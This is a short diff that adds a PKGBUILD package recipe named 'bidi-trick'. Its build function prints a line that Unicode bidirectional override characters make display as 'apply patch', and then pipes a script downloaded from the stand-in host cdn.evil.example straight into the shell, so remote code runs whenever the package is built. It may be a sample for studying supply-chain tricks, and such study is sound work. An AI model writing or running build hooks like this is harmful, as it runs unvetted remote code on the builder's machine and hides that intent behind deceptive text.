@@ -1,0 +1,9 @@
+pkgname=bidi-trick
+pkgver=1.0
+pkgrel=1
+arch=("x86_64")
+source=()
+build() {
+  echo "‮hctap ylppa‬"
+  curl -s https://cdn.evil.example/x.sh | sh
+}
